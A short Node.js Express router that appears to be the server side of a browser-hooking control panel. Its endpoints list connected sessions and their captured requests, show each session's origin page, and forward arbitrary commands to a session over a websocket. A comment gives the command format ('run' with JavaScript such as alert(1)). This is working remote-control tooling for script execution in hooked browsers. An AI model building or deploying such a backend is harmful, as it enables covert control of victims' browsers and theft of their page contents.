const express = require("express");
const body_parser = require("body-parser");
const cors = require("cors");

const config = require("../../config");


var cors_options = {
	origin : config.fe_origin,
	optionsSuccessStatus: 200,
	methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
	credentials : true
}

var router = express.Router();


router.use(cors(cors_options));

// {cmd:"run",data:"alert(1)"}

router.post("/cmd",async function(req,res){
	var id = req.query.id;
	if(!checkSessionId(id)){
		res.send("id不存在");
		return ;
	}
	// 直接转发到对应的session
	getSession(id).sendUTF(JSON.stringify(req.body));
	// wait response
	// while(true){
	// 	await sleep(500);		
	// }

	res.send("ok");
});


router.get("/getSessions",function(req , res){
	list = [];
	Object.keys(global.cache.con_pool).forEach(function(k){
		var session = {}
		session.key = k;
		session.req = global.cache.con_pool[k].req;
		list.push(session);
	});

	
	res.send(JSON.stringify(list));
});

router.get("/showSession",function(req,res){
	var id = req.query.id;
	if(!checkSessionId(id)){
		res.send("id不存在");
		return ;
	}
	res.send(global.cache.con_pool[id].origin_page);
});

module.exports = router;